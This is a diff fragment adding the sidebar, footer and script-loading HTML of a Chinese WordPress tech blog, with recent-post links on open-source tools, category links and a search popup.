+<input class="wp-block-search__input" id="wp-block-search__input-1" placeholder="" value="" type="search" name="s" required><button aria-label="搜索" class="wp-block-search__button wp-element-button" type="submit">搜索</button>
+</div>
+</form></div>
+<div class="widget widget_block">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<h2 class="wp-block-heading">近期文章</h2>
+
+
+<ul class="wp-block-latest-posts__list wp-block-latest-posts">
+<li><a class="wp-block-latest-posts__post-title" href="/archives/417">OpenResty实战系列 | 异步非阻塞HTTP客户端库 Lua-Resty-Http</a></li>
+<li><a class="wp-block-latest-posts__post-title" href="/archives/415">GitHub上的宝藏：一套免费、开源的医院管理系统</a></li>
+<li><a class="wp-block-latest-posts__post-title" href="/archives/413">开源远程桌面，TeamViewer 的替代品</a></li>
+<li><a class="wp-block-latest-posts__post-title" href="/archives/411">免费！小区物业管理系统 开源</a></li>
+<li><a class="wp-block-latest-posts__post-title" href="/archives/409">一款开源的设备资产管理系统</a></li>
+</ul>
+</div></div>
+</div>
+<div class="widget widget_block">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<h2 class="wp-block-heading">近期评论</h2>
+
+
+<div class="no-comments wp-block-latest-comments">没有评论可显示。</div>
+</div></div>
+</div>
+<div class="widget widget_block">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<h2 class="wp-block-heading">分类</h2>
+
+
+<ul class="wp-block-categories-list wp-block-categories">	<li class="cat-item cat-item-4">
+<a href="/archives/category/docker">Docker</a>
+</li>
+	<li class="cat-item cat-item-10">
+<a href="/archives/category/caozuoxitong/linuxunix">Linux/Unix</a>
+</li>
+	<li class="cat-item cat-item-9">
+<a href="/archives/category/caozuoxitong/windows">Win系统</a>
+</li>
+	<li class="cat-item cat-item-3">
+<a href="/archives/category/qianduan">前端</a>
+</li>
+	<li class="cat-item cat-item-1">
+<a href="/archives/category/kaiyuan">开源</a>
+</li>
+	<li class="cat-item cat-item-5">
+<a href="/archives/category/%e6%8a%80%e6%9c%af%e6%96%87%e7%ab%a0">技术文章</a>
+</li>
+	<li class="cat-item cat-item-6">
+<a href="/archives/category/meirifenxiang">每日分享</a>
+</li>
+	<li class="cat-item cat-item-7">
+<a href="/archives/category/wangluoanquan">网络安全</a>
+</li>
+</ul>
+</div></div>
+</div>        </aside>
+    </div>
+</div>        </div>
+    </div>
+</section>
+<!-- 3.end -->
+
+        </main><!-- main.end -->
+
+        <footer class="footer-s1">
+            <div class="linebox bg-auto"></div>
+            <div class="foottop">
+                <div class="container-xl">
+                    <div class="footmain-box">
+                        <div class="aboutus_link">
+<a href="https://www.baidu.com/" target="_blank">百度一下</a><a href="https://yunsuo.qianxin.com/" target="_blank">云锁</a><a href="https://www.d99net.net/" target="_blank">D盾</a>
+</div>
+<div class="footer-desc">免责声明：本网站部分内容由用户自行上传，如权利人发现存在误传其作品情形，请及时与本站联系。</div>
+<div class="foot-copyright">郭智满 © 2024. All Rights Reserved</div>                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- 弹出层代码 -->
+        <div class="popbg-box trans_2ms" :class="{'visible': popBgshow}" @click="popBgshow = moibleMenu = false"></div>
+        <div class="search-popup trans_2ms" :class="{'visible': searchPopup}">
+            <button type="button" class="btn-close " aria-label="Close" @click="searchPopup = false"></button>
+            <div class="search-content">
+                <div class="search-form-box">
+                    <form class="d-flex search-form" method="get" action="">
+                        <input class="form-control me-2" placeholder="搜索并按回车键..." type="text" name="s" id="search" value="" aria-label="搜索">
+                        <button class="btn btn-default btn-lg" type="submit" style="padding: 9.5px 36px;"><i class="cxicon cxicon-search"></i></button>
+                    </form>
+                </div>
+                
+            </div>
+        </div>
+        <!-- .end -->
+        </div>
+        <!--.sit-wrapper-->
+        <script type="text/javascript" src="/wp-content/themes/meteor/assets/js/swiper-bundle.min.js?ver=1.2" id="cxm2-swiper-js"></script>
+<script type="text/javascript" src="/wp-content/themes/meteor/assets/js/plugins.min.js?ver=1.2" id="cxm2-plugins-js"></script>
+<script type="text/javascript" id="cxm2-alpine-js-extra">
+/* <![CDATA[ */
+var cxjs = {"homeurl":"","jsonapi":"\/wp-json\/cxv1\/","themedir":"\/wp-content\/themes\/meteor","ajaxurl":"\/wp-admin\/admin-ajax.php","postId":"392"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="/wp-content/themes/meteor/assets/js/alpine.min.js?ver=3.13.10" id="cxm2-alpine-js"></script>
+        </body>
+
+        </html>
